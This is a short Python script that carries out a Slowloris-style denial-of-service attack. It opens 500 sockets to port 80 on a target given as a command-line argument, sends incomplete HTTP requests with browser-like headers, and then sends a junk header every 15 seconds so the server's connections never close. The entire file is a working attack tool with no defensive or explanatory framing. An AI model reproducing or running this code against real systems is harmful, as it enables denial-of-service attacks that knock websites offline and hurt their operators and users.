import socket
import random
import time
import sys

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Accept-language: en-US,en,q=0.5"
]

ip = sys.argv[1]

socket_count = 500

print("Creating sockets...")
for _ in range(socket_count):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, 80))
    except socket.error:
        break
    list_of_sockets.append(sock)


#Create the sockets
# Send regular headers
print("Setting up the sockets...")
for sock in list_of_sockets:
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for header in regular_headers:
        sock.send(bytes("{}\r\n".format(header).encode("utf-8")))

while True:
    print("Sending keep-alive headers...")
    for sock in list_of_sockets:
        sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    time.sleep(15)
